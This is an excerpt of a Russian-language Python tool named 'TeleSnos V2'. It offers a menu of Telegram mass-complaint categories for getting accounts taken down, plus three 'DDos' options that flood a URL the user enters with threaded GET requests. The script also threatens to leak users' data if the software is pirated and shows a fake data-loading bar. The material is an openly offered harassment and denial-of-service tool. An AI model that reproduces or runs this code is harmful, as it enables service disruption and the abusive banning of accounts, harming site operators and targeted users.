...
for i in range(bar_length):
  ...
  for j in range(i):
    print("#", end="")
  for j in range(bar_length - i):
    print(" ", end="")
  print("] Загрузка ваших данных...", end="")
  sys.stdout.flush()
...
print("\r" + " " * (bar_length + 50), end="")
sys.stdout.flush()

# Run your script
print(colored("При краже софта ваши данные будут слиты в сеть","red", attrs=["bold"]))
# ASCII-арт приветствия
ascii_banner = pyfiglet.figlet_format("TeleSnos V2")
colored_banner = colored(ascii_banner, color='blue', attrs=["bold"])  # Красим в цвет
...
def complaint():
	...
	print(colored("Снос","blue", attrs=["bold"]))
	print(colored("[1] Виртуальный номер", "magenta", attrs=["bold"]))
	print(colored("[2] Премиум","blue", attrs=["bold"]))
	print(colored("[3] Оскорбление","magenta", attrs=["bold"]))
	print(colored("[4] Нарушение правил", "blue", attrs=["bold"]))
	print(colored("[5] Сессий", "magenta", attrs=["bold"]))
	print(colored("[6] Спам", "blue", attrs=["bold"]))
	print(colored("[7] Прайс", "magenta", attrs=["bold"]))
	print(colored("[8] Накрутка", "blue", attrs=["bold"]))
	print(colored("Дополнительно","magenta", attrs=["bold"]))
	print(colored("[9] DDos","blue", attrs=["bold"]))
	print(colored("[10] DDos v2","magenta", attrs=["bold"]))
	print(colored("[11] DDos v3","blue", attrs=["bold"]))
	print(colored("[0] Выход", "magenta", attrs=["bold"]))
	complaint_choice = input(colored("Введите номер: ", "cyan", attrs=["bold"]))
	...
	if complaint_choice in ["1", "2", "3", "4", "6", "7", "8"]:
	...
	elif complaint_choice in ['9', '10', '11']:
		# Выполняем сценарий ddos
		url = input(colored("Введите URL сайта: ", "cyan", attrs=["bold"]))
		количество_запросов = int(input(colored("Введите количество запросов: ", "cyan", attrs=["bold"])))

		потоки = []

		# Создаем и запускаем потоки для всех запросов сразу
		for i in range(количество_запросов):
			поток = threading.Thread(target=отправить_запрос, args=(url, i+1))
			потоки.append(поток)
			поток.start()
		...
		print(colored("Все запросы выполнены", "green", attrs=["bold"]))
	else:
		print("")
...
def отправить_запрос(url, номер_запроса):
  """Отправляет GET-запрос на указанный URL с обработкой ошибок."""
  try:
    ответ = requests.get(url)
    print(colored(f"Запрос {номер_запроса} отправлен", "green", attrs=["bold"]))
  except requests.exceptions.ConnectionError as e:
    print(colored(f"Ошибка подключения во время запроса {номер_запроса}", "yellow", attrs=["bold"]))
  except requests.exceptions.RequestException as e:
    print(colored(f"Ошибка во время запроса {номер_запроса}", "red", attrs=["bold"]))